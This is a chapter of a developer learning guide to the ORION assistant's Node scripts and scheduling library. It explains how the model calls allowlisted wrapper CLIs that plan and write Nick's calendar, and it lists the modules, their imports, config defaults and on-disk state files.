# 06 — Scripts and the Node "life loop"
> Part of the ORION Learning Guide. Snapshot: 6c93032 (2026-10-14).
> Covers: `scripts/` (every executable), `scripts/lib/life`, `scripts/lib/reach`, `scripts/lib/attention`, `scripts/lib/focus`, `scripts/lib/connect`, `scripts/lib/notify`, `scripts/lib/remote` (high level), `scripts/lib/usage`, `scripts/lib/orion-automation-*`, `scripts/connectors/`, and the calendar write path through `native/OrionMacBridge` (interface only). Read after: `00_START_HERE.md`, `04_plugin_core_actions_gate.md`, `05_plugin_turn_pipeline.md`.
> Not covered here (see chapter 09): `scripts/lib/agentic`, `scripts/lib/eval`, `scripts/eval`, the `orion_v2_*` and `orion-v3-*` scripts. Claims and reply-lint internals are in chapter 05.

Some modules in this area exist only uncommitted in the worktree at the snapshot (the worktree is dirty); where that matters the section says so. Line numbers are against the working tree, not against HEAD.

## In this file

| § | Title | What you learn |
|---|---|---|
| 1 | Overview: what "the life loop" is | The mental model, who calls which script, and the rules that all scripts share |
| 2 | The scheduling engine: `scripts/lib/life/*.mjs` | Every pure module that plans, moves, shrinks and journals the day |
| 3 | The life-loop CLIs | `orion-reschedule`, `orion-agenda`, `orion-tasks`, `orion-standing`, the calendar write path and the rest |
| 4 | Reach and proactivity | How ORION decides to talk first: presence, routing, triage, notify, cron delivery, weather |
| 5 | Attention | The item store, scoring, ranking, budget and gate that decide what is worth interrupting for |
| 6 | Focus, on-task, lock, phone time | Escalation ladder, on-task watching, Mac and phone enforcement |
| 7 | Connectors | Gmail, Canvas, TfL, finance, iMessage and the declarative connector spec |
| 8 | Remote | `orion-remote` and `orion-remote-bridge`, the phone and Discord handler |
| 9 | Operations CLIs | Deploy, doctor, timezone, backup, costs, budget, keys |
| 10 | Repair, incidents, the automation runtime | `orion-repair`, `orion-incident*`, `orion-automation*` |
| 11 | CLI index | One row for every executable in `scripts/` |

---

## 1. Overview: what "the life loop" is

### The loop in one paragraph

README.md states the product loop as "Plan, remind, observe, intervene, follow up, adapt" (`README.md:10`). The life loop is the Node half of that: a set of pure modules (`scripts/lib/life/`, 48 files at this snapshot) that decide what Nick's day should look like, plus 175 entries (171 files plus 4 directories) in `scripts/` that are thin command-line wrappers around those modules. The language model never touches the calendar directly. It runs a wrapper script such as `orion-reschedule move "Gym" --to 19:00`, the wrapper calls the pure planner, the planner talks to Apple Calendar through a Swift CLI (`native/OrionMacBridge`), and the script prints a plain-text receipt ("Changed Friday: Gym moved: 18:00 -> 19:00-20:00") that the model is required to quote.

### The layers, top to bottom

```
Nick (voice, phone, Discord, Mac app)
   |
   v
OpenClaw agent (Claude Haiku, escalating to Sonnet)      <- chapter 05
   |  exec "<full path>/orion-reschedule ..."   (allowlisted wrapper, argv, no shell features)
   v
scripts/orion-*  (Node ESM, #!/usr/bin/env node)            <- chapters 06 (this one)
   |  import
   v
scripts/lib/life/*.mjs   (pure planning: no network, injectable clock + bridge)
   |  bridgeRequest(action, payload)    scripts/lib/life/bridge-path.mjs
   v
native/OrionMacBridge  (Swift, EventKit)  ->  Apple Calendar / Reminders
```

Other things feed or follow the loop:

- Cron and LaunchAgents run scripts on a timer (`orion-morning`, `orion-watch`, `orion-attention-collect`, ...). Names of the LaunchAgents present on this Mac at the snapshot: `ai.openclaw.gateway`, `com.nickmadaio.orion.dashboard`, `com.nickmadaio.orion.remote`, `com.nickmadaio.orion.tts`, `com.nickmadaio.orion.voiceid`. Cron jobs live inside the OpenClaw gateway, not launchd; see §4 and §10.
- The Swift Mac app (`native/Orion`) shells out to some of the same scripts (`native/Orion/Sources/Orion/AppState.swift:86-94` runs `orion-reschedule early --check --dry-run` and `early`); each section lists the callers it found.
- The TypeScript plugin (`plugin/orion-control/src`) holds the instruction text the model sees (`job-instructions.ts`, `local-routing.ts`, `schedule-flow.ts`) and code that compiles a model-written form into exact `orion-reschedule` argv. Chapter 04 and 05 explain that side.

### Rules that every script in `scripts/` follows

These are conventions, not a framework. Knowing them lets you predict how any script behaves.

1. **Plain-text receipts the model must quote.** Scripts print what happened or what did not ("NOTHING WAS BOOKED", "NOT BOOKED: Study (120 min) did not fit"). The model instructions in `plugin/orion-control/src/job-instructions.ts` (the `SCHEDULING_INSTRUCTIONS` constant, line 5) tell it to quote times only from that output, and the claims checker in chapter 05 verifies a "done" claim against it.
2. **`--dry-run` before write.** Calendar-writing commands accept `--dry-run` and print the plan without touching the calendar.
3. **Everything reversible is journaled.** Calendar changes go into a journal so `orion-reschedule undo` can put them back (see §3).
4. **Injectable clock and bridge for tests.** `ORION_RESCHEDULE_NOW` overrides "now"; `ORION_BRIDGE_BIN` overrides the Swift bridge path (`scripts/lib/life/bridge-path.mjs:16-40`). During a schedule evaluation, eval mode swaps in a sandbox calendar file (`~/.openclaw/orion-controlled/eval-calendar.json`) so real calendars are not touched.
5. **Allowlisted wrappers only.** README: "The model can't call arbitrary shell commands, only allowlisted wrapper scripts" (`README.md:108`). Commands that widen ORION's own permissions (for example `orion-connect-admin`) are intentionally never on the allowlist.
6. **Secrets by name.** Scripts read credentials from the macOS Keychain or environment variables by name; none are stored in the repo. This guide lists names only.

### How the model is told to use the life loop

The model's scheduling rules reach it from two places, and they overlap on purpose:

- `plugin/workspace/SCHEDULING.md` (130 lines): durable preferences in prose, loaded into scheduling chat turns. It covers to-dos with due dates and spreads (`orion-tasks`), the class wrapper (45 minutes of travel before the first class and after the last; a home trip if two classes are 2.5 hours or more apart), shrinking and finishing early, removing things, skipping a class, the priority scale (fixed, high, medium, low), protected time (five-minute transitions, naps of at least 75 minutes, one hour of side project daily) and class reminders. Its own text says prose is not enforcement: "A prose memory alone is not enforcement" (`plugin/workspace/SCHEDULING.md:116`). The enforced values live in `life-config.json` (`bufferMinutes=5`, `commuteMinutes=45`, `homeGapMinutes=150`, `ranks`, `minimums.nap=75`, `minimums.side project=60`), read by `scripts/lib/life/config.mjs` (§2).
- `SCHEDULING_INSTRUCTIONS` in `plugin/orion-control/src/job-instructions.ts:5`: a long system prompt for the dedicated "change his day" job. It lists the full `orion-reschedule` usage, a six-step procedure ("Pick ONE command that does the whole thing", "Use no more than four tool calls in total"), reply rules ("Quote times ONLY from the command's output"), and a table of how to read tool results ("Command still running" means not finished; "needs approval" means not done). It is a compact reference for what the CLIs promise.

Why two copies: SCHEDULING.md is Nick's durable intent, written in his voice and dated by incident (for example the 2026-10-05 nap booked at 12:30 the minute a lecture ended, which is why the class wrapper paragraph exists, `plugin/workspace/SCHEDULING.md:29-50`). The job instruction is the operating manual for a specific job and is easier to evaluate.

### History in one view

- 2026-09-29: the life modules were built by the local agentic dev loop (see chapter 09). Commit subjects such as `7947249 agent(life-block): Block shape and validation`, `a9e5e43 agent(life-priority): Priority ranking`, `b8a2e21 agent(life-weekly)`, `99620b4 agent(life-template-daily)`, `7ddf825 agent(life-gaps)` all carry the date 2026-09-29. `git log --oneline -- scripts/lib/life` returns 48 commits at the snapshot.
- 2026-10-05 and 2026-10-06: the class wrapper, shrink and early-exit rules, `skip`, and `orion-tasks` with due dates and spreads (dates in `SCHEDULING.md` headings).
- 2026-10-01: sandbox calendar for evaluation (`scripts/lib/life/bridge-path.mjs:1-5` header comment).
- Latest commits in the HEAD log relate to this loop: `6c93032` a finished to-do's booked sessions come off its days; `7f82b2c` redesigned to-do list shared by Mac and phone; `b5bf4ab` "remind me at 11" is `alarm_set`, never a to-do.

Tests: `tests/` holds 221 files at the snapshot, many named for the module they pin (`life-block.test.mjs`, `life-bedtime.test.mjs`, `attention-gate.test.mjs`, `focus-cli.test.mjs`). Run with `node --test tests/*.test.mjs` (`README.md:142`). Each section below names the tests that pin its behavior.

### Walk it yourself

- `ls /Users/nickmadaio/Desktop/ORION/scripts | wc -l` then `ls scripts/lib/life`: see the size of the surface.
- Open `scripts/orion-life` (about 30 lines): the smallest complete life-loop CLI (parse argv, call `lib/life/config.mjs`, print).
- Open `plugin/orion-control/src/job-instructions.ts` line 5 and read the "How to do this job well" block.
- Open `plugin/workspace/SCHEDULING.md` and find the three headings that carry a date; each marks an incident or a decision.

### Questions to ask your tutor

1. Why does ORION keep the planner as pure modules with an injected bridge instead of letting the model call the calendar tool directly?
2. What is the difference between a preference in `SCHEDULING.md` and a value in `life-config.json`, and which one wins when they disagree?
3. Why are receipts printed as plain text rather than JSON, and how does the claims checker use them?
4. What would break if two `orion-reschedule add` calls ran in parallel, and which flag exists to avoid that (`day --plan`)?
5. Which scripts are meant for the model, which for cron and which for Nick himself, and where is that decided?

---
## 2. The scheduling engine: scripts/lib/life/*.mjs

**In this section**

| Part | What it covers |
|---|---|
| 2.1 | Orientation: what the engine is, vocabulary, conventions, status in git, how it is tested |
| 2.2 | The block (the one data shape everything passes around) |
| 2.3 | Module inventory (all 45 files) with who actually imports each |
| 2.4 | Import graph (module -> imports -> imported by which CLIs) |
| 2.5 | Data on disk (which module reads/writes which file) |
| 2.6 | Config keys and defaults (`config.mjs` + the live override file) |
| 2.7 | How the modules compose into the day-planning pipeline |
| 2.8 | Worked example (real output from running the pure functions) |
| 2.9 | Full write-ups of the important modules |
| 2.10 | Short write-ups of the supporting modules |
| 2.11 | Short write-ups of the minor and not-yet-wired modules |
| 2.12 | Cross-cutting gotchas |

Snapshot: branch `orion-v2/backlog-checkpoint`, HEAD `6c93032`, 2026-10-14. All paths are from the repo root `/Users/nickmadaio/Desktop/ORION`.

---

### 2.1 Orientation

- **What it is.** `scripts/lib/life/` is the pure-ish library that decides where things go in Nick's day. It has 45 `.mjs` files, 3,924 lines. It does not talk to the model. The model (see `docs/learn/04_plugin_core_actions_gate.md`) calls CLIs such as `orion-reschedule`, `orion-tasks`, `orion-agenda`, and those CLIs import these modules. The CLIs live in `scripts/orion-*` (no file extension, `#!/usr/bin/env node`), and the modules here are their brain.
- **Why it exists.** The first version of "plan my day" was the model composing calendar edits itself. It overlapped blocks, put gym at 1 PM before soccer, forgot "tomorrow". The `37c29fd` commit (2026-09-30, "plan, remind, observe, adapt: the daily life loop") moved the logic into deterministic code, and every later fix (`2602593`, `752ac71`, `afe697b`, `0a0aa7e`) tightened one rule at a time. The design principle is stated in the header of `scripts/lib/life/day-check.mjs:1-10`: instead of "this case should not overlap", encode the invariant and check it on the finished plan before anything reaches the calendar.
- **Units and conventions (everything depends on these).**
  - **Time of day = integer minutes after local midnight** (`540` = 09:00). A time past `1440` means "after midnight" (bedtime `1395` = 23:15, `1500` = 01:00 next day). Blocks are always 0..1440 and `start < end`.
  - **Dates = `YYYY-MM-DD` strings**, compared lexicographically. Several modules deliberately build dates at `T12:00:00` to dodge DST.
  - **Weekday numbering is NOT consistent across modules** (a real trap, see 2.12): `plan-parse.mjs` and `task-spread.mjs` use JS `getDay()` (0 = Sunday); `config.gymDays`, `fill-day.mjs`, `daily-needs.mjs`, `weekly.mjs` use ISO (1 = Monday ... 7 = Sunday). The callers convert with `((getDay() + 6) % 7) + 1` (`scripts/orion-reschedule:619`, `scripts/orion-now:41`).
  - **Immutability.** Almost every function returns new objects (`{ ...b, start }`), following Nick's global coding rule. Exceptions that mutate local arrays only: `freeGaps` mutates its own merged copies (`gaps.mjs:44`), `deadline-ramp.mjs` `byDate.set`.
  - **Purity.** Only these modules do I/O: `config.mjs` (reads/writes life-config), `bridge-path.mjs` (spawns the Mac bridge), `calendar-write.mjs` (bridge + undo file + pins), `live-day.mjs` (`calendarEvents`/`liveDay` call the bridge), `pins.mjs`, `skips.mjs`, `history.mjs`, `night.mjs` (`readWakeRequest`), `todo-lists.mjs` (`sweep`). Everything else is a function of its arguments and is unit-tested directly.
- **Eval/sandbox hook.** `bridge-path.mjs` and the files that persist state (`config.mjs:9-10`, `pins.mjs:6`, `skips.mjs:8-9`, `calendar-write.mjs:10-11`) switch to `eval-`-prefixed files when `sandbox()` is non-null, i.e. when the eval marker `~/.openclaw/orion-controlled/eval-mode` is under 2 hours old (`scripts/lib/eval-mode.mjs`) AND a sandbox calendar `eval-calendar.json` exists. That is how ORION's schedule evaluation can "move, resize and swap things for real" without touching Nick's calendar.
- **Git status.** `git status --short scripts/lib/life` prints nothing: **all 45 files are committed and unmodified** in the dirty worktree. (The dirty files are in `plugin/orion-control/dist`, `docs/evals`, etc., not here.) Most modules date from two bursts: 2026-09-29/30 (the Qwen agent project plus Claude's takeover, `37c29fd`) and 2026-10-01 (day-rule fixes). The newest edits: `task-notes.mjs` 2026-10-13 (`7f82b2c`), `task-spread.mjs` 2026-10-06, `freed-time.mjs` 2026-10-06, `live-day.mjs`/`skips.mjs`/`calendar-write.mjs` 2026-10-06 (`e568abb`).
- **Tests.** 43 test files import from `lib/life` (listed in 2.3). Run: `node --test tests/life-*.test.mjs tests/tighten-*.test.mjs` (`HANDOFF.md:180` records 207/207 passing at one point; I did not re-run them). The test runner is Node's built-in `node:test`. Scenario/property-style tests: `tests/life-day-invariants.test.mjs` (checks `checkDay` over `replan`), `tests/life-day-scenarios.test.mjs` (10 scenario days through `replan`).
- **Who the "tighten-orion" and "agent(...)" commits are.** Many headers say "tighten-orion/..." or "Written by Claude after Qwen's run stopped, 2026-09-30". Nick ran a local Qwen model through ORION's agent-project system on small module-sized tasks (`agent(grant-policy): Extra phone time policy`, `agent(day-review): Planned against done`, ...). When Qwen stopped (Nick went to class), Claude finished the rest (`HANDOFF.md:465`: "just take over all of qwen's work"). That is why the early modules (`block`, `weekly`, `gaps`, `priority`, `fit-study`, `follow-through`, `deferral`, `grant-policy`, `day-review`) have very uniform "Decision N" comments and strict input validation that `throw new TypeError(...)`, while the later hand-fixed modules (`replan`, `commute`, `lengths`) have long narrative headers quoting Nick.

### 2.2 The block: the one shape everything passes around

Defined in `scripts/lib/life/block.mjs:1-146` (validation) and produced from calendar events by `live-day.mjs:40-59` (`toBlocks`).

```js
// scripts/lib/life/block.mjs:1-18
export const KINDS = Object.freeze(["class","sleep","gym","deadline","study","side_project","meal","other","rest"]);
export const SOURCES = Object.freeze(["calendar","template","orion","nick"]);
```

| Field | Type | Meaning |
|---|---|---|
| `id` | string, `/^[a-z0-9][a-z0-9:._-]{0,79}$/` | Stable within a plan. `toBlocks` builds `cal-<index>-<normalized calendar identifier>` (`live-day.mjs:53`); `replan` invents `new-<i>`, `new-fixed-<i>`, `blocked-<i>`; templates use `<entry.id>-<date>` (`weekly.mjs:97`) |
| `title` | string 1..120 | Shown to Nick; also what name matching (`sameThing`) works on |
| `kind` | one of KINDS | Drives priority, shrink rules, preferred time of day |
| `date` | `YYYY-MM-DD` | |
| `start`, `end` | int minutes, `0<=start<1440`, `0<end<=1440`, `start<end` | |
| `fixed` | boolean | `true` = a wall: never moved by ORION |
| `source` | one of SOURCES | `orion` = ORION booked it itself (always movable); `calendar` = came from Apple Calendar; `template` = weekly timetable; `nick` = a time he stated in this call |
| `calendarId` | string or null | Not in `block.mjs` (its `normalizeBlock` keeps only the 8 fields above). Added by `toBlocks` so `calendar-write` can address the Apple Calendar event |
| `pinned` | boolean | Added by `pins.mjs:17`: an ORION block at a time Nick chose, treated as fixed this run but still user-movable |
| `importance` | 0/1/2 | Optional. 0 = must, 1 = normal, 2 = optional (`priority.mjs:23`) |

**Important:** `block.mjs` has **no importer in any CLI** (only `tests/life-block.test.mjs`). The CLIs never call `validateBlock`; `live-day.toBlocks` and `replan` construct blocks by hand, and the day-rule check is `day-check.mjs`. `block.mjs` is the written-down contract (and its `KINDS` list is duplicated in `priority.mjs:1-11`).

**fixed vs movable in practice** (`live-day.mjs:50-52`):

```js
// scripts/lib/life/live-day.mjs:50-52
// ORION's own blocks always move, whatever the title says: the to-do "DS lab"
// was filed as a class and pinned in place over his lunch (2026-10-01).
const fixed = e.orion ? false : kind === "class" || kind === "deadline" || !movable(title, null);
```

So a calendar event is a wall unless (a) ORION created it (the bridge marks ORION-created events with an `orion` kind label, passed as `payload.orionKind` on create, `calendar-write.mjs:78`), or (b) it matches `MOVABLE_ALONE` (study, gym, nap, groceries, meals ...) and is not `isSocial` (with/friends/club/appointment/flight/...). A class (`kind === "class"`) is always fixed, and "real class" everywhere means `kind === "class" && fixed && source !== "orion"` (`commute.mjs:11`, `early.mjs:5-7`, `priority.mjs:76`, `sensible-time.mjs:14`, `class-reminders.mjs:6`).

---

### 2.3 Module inventory

"Imported by" lists the **executables** (`scripts/orion-*`) that import the module, found by `grep -rnE "lib/life/<name>.mjs" scripts`. "Lib-only" means only other modules in this folder import it. "Tests only" means no executable imports it at HEAD. Line counts are `wc -l`.

| Module | Lines | One-line role | Imported by (executables) | Test file(s) |
|---|---|---|---|---|
| `after-late-night.mjs` | 35 | After a short night: add a nap, push early study later | orion-watch | life-after-late-night, life-commute |
| `bedtime.mjs` | 23 | How hard to nudge him to sleep (gentle/firm/escalated) | orion-now | life-bedtime |
| `block.mjs` | 146 | Block shape validation | **tests only** | life-block |
| `bridge-path.mjs` | 46 | Which calendar bridge, and what time it is | orion-agenda, orion-eval-schedule, orion-morning, orion-ontask-watch, orion-proactive, orion-remote, orion-reschedule, orion-tasks, orion-v3-pipeline, orion-watches (+ `scripts/lib/eval/v3/sandbox.mjs`) | (none directly) |
| `calendar-write.mjs` | 122 | Apply moves/creates/deletes through the bridge, with undo journal | orion-plan-study, orion-reschedule, orion-watch | life-calendar-write, life-undo-journal |
| `class-reminders.mjs` | 11 | "Class starts in N minutes at <campus>" | orion-checkin, orion-watch | scheduling-notification-policy |
| `commute.mjs` | 40 | Travel-time walls around classes and social plans | orion-morning, orion-proactive, orion-remote, orion-reschedule, orion-watch | life-commute |
| `config.mjs` | 115 | Standing preferences file, validators, setters | orion-agenda, orion-agenda-change, orion-life, orion-morning, orion-proactive, orion-remote, orion-reschedule, orion-tasks, orion-watch | (used in life-fill-day) |
| `daily-needs.mjs` | 58 | What a day should contain vs what it has | orion-now | life-daily-needs |
| `day-check.mjs` | 41 | The day invariants (no overlaps etc.) | orion-reschedule | life-day-invariants |
| `day-review.mjs` | 148 | End-of-day "planned vs done" sentence | **tests only** | truthful-day-review |
| `deadline-ramp.mjs` | 98 | Study minutes per day ahead of an exam/quiz | orion-reschedule | tighten-deadline-ramp |
| `deferral.mjs` | 27 | Is "I'll do it later" a pause, a change or avoidance | orion-checkin | life-deferral |
| `distraction.mjs` | 32 | Phone use: nudge vs lock decision | **tests only** (mirrored in Swift `ScreenWatch.swift:12`) | tighten-distraction |
| `early.mjs` | 218 | "I finished early" / "I'm out of class early": pull the day forward | orion-reschedule | surfaces-early |
| `fill-day.mjs` | 47 | Which standing needs to propose into the gaps | orion-reschedule | life-fill-day |
| `fit-study.mjs` | 54 | Fit study sessions into free gaps, displacing low-priority blocks | orion-plan-study, orion-study | life-fit-study |
| `follow-through.mjs` | 48 | State machine: plan -> remind -> intervene -> done for one block | orion-checkin | life-follow-through |
| `freed-time.mjs` | 50 | What to do with time freed by finishing early | orion-reschedule | life-freed-time |
| `gaps.mjs` | 72 | Free intervals inside a window | orion-reschedule, orion-watch | life-gaps |
| `grant-policy.mjs` | 125 | How many minutes of extra phone time to grant | **tests only** | truthful-grant-policy |
| `history.mjs` | 44 | Planned-vs-actual log -> patterns.json | orion-checkin, orion-now, orion-patterns, orion-reschedule, orion-watch | life-history |
| `lateness.mjs` | 211 | Stats on how late he starts things | orion-patterns | tighten-lateness |
| `lengths.mjs` | 87 | Minimum lengths and shrink-to-fit | orion-reschedule | life-lengths |
| `live-day.mjs` | 68 | Calendar events -> blocks; classification | orion-checkin, orion-morning, orion-now, orion-ontask-watch, orion-plan-study, orion-proactive, orion-quick, orion-remote, orion-reschedule, orion-tasks, orion-watch | life-replan |
| `morning-brief.mjs` | 50 | The <=300-char first message of the day | orion-watch | tighten-morning-brief |
| `next-action.mjs` | 23 | "What should he do next?" | orion-next, orion-now | life-next-action |
| `night.mjs` | 90 | Wake / asleep-by markers; actual wake/sleep | orion-reschedule, orion-watch (and the Swift `NightMarkers.swift`) | life-night |
| `patterns.mjs` | 27 | Medians from history | orion-patterns | life-patterns |
| `pins.mjs` | 18 | "Nick placed this" calendar ids survive cascades | orion-reschedule (and calendar-write) | (none directly) |
| `plan-parse.mjs` | 538 | Free text -> dated plan items | orion-reschedule (`--say`) | tighten-plan-parse |
| `priority.mjs` | 87 | Kind priority, importance, rank words | orion-remote (`rankOf`), replan, lengths, fit-study, next-action (lib) | life-priority, life-rank |
| `replan.mjs` | 161 | The core placement engine | orion-reschedule | life-replan, life-day-scenarios, life-day-invariants, life-sensible-time |
| `sensible-time.mjs` | 28 | Earliest start / natural time of day for untimed plans | orion-reschedule | life-sensible-time |
| `skips.mjs` | 23 | Occurrences he said he is skipping | orion-reschedule (and live-day, calendar-write) | (none directly) |
| `sleep-state.mjs` | 19 | day / awake_late / winding_down / probably_asleep | orion-now | life-sleep-state |
| `study-request.mjs` | 233 | "two one-hour sessions for macro by friday" -> minutes/subject/date | orion-plan-study, orion-study | life-study-request |
| `sync-apply.mjs` | 37 | Fold offline events into a state object | **tests only** | life-sync-apply |
| `sync-event.mjs` | 25 | Offline change-event format/validation | lib-only (sync-merge) + tests | life-sync-event |
| `sync-merge.mjs` | 18 | Deterministic merge of two event logs | **tests only** | life-sync-merge |
| `task-notes.mjs` | 40 | A to-do's notes: spread line, subtasks | orion-reschedule, orion-tasks (and Swift `TaskNotes.swift`) | life-task-notes |
| `task-spread.mjs` | 130 | "2 hours a day until due" -> sessions per date; waits-for | orion-morning, orion-proactive, orion-reschedule, orion-tasks | life-task-spread |
| `todo-lists.mjs` | 45 | Sweep reminders from other lists onto the Orion list | orion-agenda-change, orion-watch | life-todo-lists |
| `todo-parse.mjs` | 255 | "add finish resume and email prof by friday" -> tasks | orion-reschedule, orion-tasks | truthful-todo-parse |
| `weekly.mjs` | 111 | Expand a weekly timetable into dated blocks | **tests only** | life-weekly |

**Summary of what is not wired into any executable at HEAD:** `block`, `day-review`, `distraction` (Swift reimplementation exists), `grant-policy`, `sync-apply`, `sync-event`, `sync-merge`, `weekly`. `lateness`, `patterns` are used only by the read-only `orion-patterns` report. These are the "Needs wiring" items from the takeover review (`docs/planning/v2/LIFE_LOOP_REVIEW.md`). **(inferred)** that phone-side counterparts, not these files, serve the live product for sync/distraction/grants; I confirmed only that the Swift `ScreenWatch.swift:12` comment points at `distraction.mjs` as the reference.

---

### 2.4 Import graph

Internal imports are exact (from `grep "^import\|await import" scripts/lib/life/*.mjs`). The right-hand column is the executables from the table in 2.3.

**Edges inside the folder (module -> what it imports):**

| Module | Imports (inside `lib/life`) | Also imports outside |
|---|---|---|
| `after-late-night` | `gaps` (freeGaps), `lengths` (minimumFor) | |
| `bridge-path` | | `../eval-mode.mjs` (`evalMode`), `node:child_process` |
| `calendar-write` | `bridge-path` (bridgeRequest, sandbox), `pins` (readPins, savePins), `skips` (dynamic `await import`, only for undo of a skip, `calendar-write.mjs:44`) | |
| `commute` | `live-day` (isSocial) | |
| `config` | `bridge-path` (sandbox) | |
| `early` | `commute` (commuteWalls) | |
| `fill-day` | `gaps` | |
| `fit-study` | `gaps`, `priority` (priorityOf) | |
| `freed-time` | `lengths` (minimumFor) | |
| `history` | `patterns` (learnPatterns), `live-day` (classify) | |
| `lengths` | `priority` (priorityOf) | |
| `live-day` | `config` (ignoredEvent), `bridge-path` (bridgeRequest), `skips` (isSkipped) | |
| `next-action` | `priority` (comparePriority) | |
| `night` | `config` (toMinute) | |
| `pins` | `bridge-path` (sandbox) | |
| `replan` | `gaps`, `priority` (importanceOf, priorityOf) | |
| `skips` | `bridge-path` (sandbox) | |
| `sync-merge` | `sync-event` (validateEvent) | |
| **no imports (leaves)** | `plan-parse`, `todo-parse`, `study-request`, `task-spread`, `task-notes`, `deadline-ramp`, `priority`, `gaps`, `grant-policy`, `day-review`, `weekly`, `lateness`, `patterns`, `block`, `day-check`, `daily-needs`, `bedtime`, `sleep-state`, `follow-through`, `deferral`, `distraction`, `morning-brief`, `class-reminders`, `sensible-time`, `sync-event`, `sync-apply`, `todo-lists` | |

Two consequences worth knowing. (1) There is **one cycle-shaped dependency trap**: `commute` imports `live-day` (for `isSocial`), and `live-day` imports `config` and `skips`, which import `bridge-path`. So importing the pure `commute` or `history` pulls in `config.mjs`, which evaluates `sandbox()` at import time (reads the eval marker file with `statSync`, and the sandbox calendar if present). That is a read of two files under `~/.openclaw/orion-controlled/` at import, not a write. (2) `plan-parse`, `todo-parse`, `study-request` each `import { strict as assert } from 'node:assert'` and never use it (line 1 of each; `grant-policy` had the same import removed in `b9fc452`, "remove unused node:assert import").

**Edges from executables into the folder (CLI -> modules it imports)** — this is the transpose of the "Imported by" column and is the quickest way to see what each CLI is made of:

| CLI | Modules imported |
|---|---|
| `scripts/orion-reschedule` (993 lines, the main one) | live-day, replan, gaps, day-check, fill-day, config, calendar-write, skips, deadline-ramp, plan-parse, todo-parse, task-spread, task-notes, commute, sensible-time, night, history, lengths (x2 import lines), bridge-path, pins, early, freed-time (`orion-reschedule:43-65`) |
| `scripts/orion-tasks` (244) | bridge-path, live-day, config, task-spread, todo-parse, task-notes (`:30-35`); spawns `orion-reschedule` for the actual booking |
| `scripts/orion-watch` (199) | live-day, gaps, after-late-night, config, calendar-write, morning-brief, commute (commuteBlocks), todo-lists (`sweep`), night, history (`summarize`), class-reminders (`:21-33`) |
| `scripts/orion-now` (60) | live-day, next-action, sleep-state, bedtime, daily-needs, history (`loadPatterns`) (`:11-16`) |
| `scripts/orion-checkin` (188) | live-day, follow-through, deferral, history (recordOutcome, loadPatterns, lateHabit), class-reminders (`:22-24`) |
| `scripts/orion-morning` (119), `scripts/orion-proactive` (88) | live-day, bridge-path, config, commute, task-spread (`waitsFor` only) |
| `scripts/orion-plan-study` (58) | study-request, fit-study, live-day, calendar-write (`:7-10`) |
| `scripts/orion-study` (29) | study-request, fit-study (reads a day-JSON file, no calendar) |
| `scripts/orion-life` (25) | config (`loadConfig, setConfig, setMinimum, setRank`) |
| `scripts/orion-patterns` (43) | patterns, history (`HISTORY_FILE`), lateness |
| `scripts/orion-next` (18) | next-action |
| `scripts/orion-remote` (1,870) | live-day, bridge-path, config, commute, and a dynamic `import("./lib/life/priority.mjs")` for `rankOf` at `:567` |
| `scripts/orion-agenda` (299), `scripts/orion-agenda-change` (161), `scripts/orion-quick`, `scripts/orion-ontask-watch`, `scripts/orion-watches`, `scripts/orion-eval-schedule`, `scripts/orion-v3-pipeline` | a subset of bridge-path / config / live-day / todo-lists (see 2.3) |

---

### 2.5 Data on disk

All paths are under `~/.openclaw/orion-controlled/` unless noted. `eval-` variants exist for config, pins, skips and the undo journal during an evaluation run (`sandbox()` truthy). No file here holds secrets. Writes are atomic: write `file.tmp` then `renameSync` (`config.mjs:80-82`, `pins.mjs:13`, `skips.mjs:11`, `history.mjs:31`).

| File | Env override | Module / line | Op | Shape / what |
|---|---|---|---|---|
| `life-config.json` | `ORION_LIFE_CONFIG` | `config.mjs:9-10`; read `loadConfig:44`; write `setConfig:86`, `setMinimum:71`, `setRank:104` | R/W | Flat JSON of overrides on top of `DEFAULTS` (see 2.6). Live copy on this Mac holds `readyMinutes:105, bufferMinutes:5, commuteMinutes:45, homeGapMinutes:150, minimums:{nap:75,"side project":60}, ranks:{gym:"high"}` |
| `eval-life-config.json` | same | `config.mjs:10` | R/W | The sandbox copy |
| `eval-calendar.json` | `ORION_SANDBOX_CALENDAR` | `bridge-path.mjs:16,24-26` | R | A fake day `{ now, ...events }` written by `orion-eval-schedule`; its presence + eval marker switches bridge and clock |
| `eval-mode` | `ORION_EVAL_MARKER` | `scripts/lib/eval-mode.mjs` | R (mtime) | A marker file; "on" while under 2 hours old |
| `reschedule-undo.json` | `ORION_RESCHEDULE_UNDO` | `calendar-write.mjs:10-11, 94-100, 103-113, 116-122` | R/W | Array of the last 10 journal entries `{ at, group?, pinsBefore?, steps:[{op:"move"|"create"|"delete"|"unskip", identifier, title, start, end, orionKind?}] }` |
| `pins.json` | `ORION_RESCHEDULE_PINS` | `pins.mjs:6-14` | R/W (mode 0600) | `{ "<YYYY-MM-DD>": ["<calendar event identifier>", ...] }` |
| `skipped-events.json` | `ORION_SKIPS_FILE` | `skips.mjs:8-11,17-23` | R/W | `[{ title, start (ISO) }]`; `addSkip` drops entries older than 14 days |
| `life-history.jsonl` | `ORION_LIFE_HISTORY` | `history.mjs:13,17-22` | append | One JSON line per finished check-in: `{ at, what, kind, plannedStart, actualStart|null, weekday }` |
| `patterns.json` | `ORION_PATTERNS_FILE` | `history.mjs:14,24-33,35-37` | R/W | `{ updatedAt, samples, byKind:{<kind>:{planned,happened,rate,medianDelay}}, wake:{median,samples}, sleep:{median,samples} }` |
| `wake-request.json` | none | `night.mjs:48` | R | `{ at: ISO }` written by `orion-wake` ("wake me at 7:30") |
| `night.json` | none | written by `scripts/orion-watch:96-97`, read by Swift `NightMarkers.swift` | (not this folder) | `{ updatedAt, days:[{date,wake,bed,...actual}] }` computed by `night.mjs` |
| `sleep-actual.json`, `health-log.json` | `ORION_HEALTH_LOG` | read by `orion-watch:58,75` and passed into `night.actualWake/actualSleep` | R (not this folder) | WHOOP nights, `sleepLog` events, `phoneSignals` |
| `checkins.json` | `ORION_CHECKIN_FILE` | `scripts/orion-checkin:31` (holds `follow-through` loop objects) | R/W (not this folder) | One loop per check-in |
| `task-sessions.json` | `ORION_TASK_LEDGER` | `scripts/orion-tasks:93` | R/W (not this folder) | `{ titles:[...] }`: which to-dos ORION has booked sessions for |
| `watch.json` | `ORION_WATCH_FILE` | `scripts/orion-watch:37` | R/W (not this folder) | the per-day state of the watch loop (what was asked/alerted/swept) |

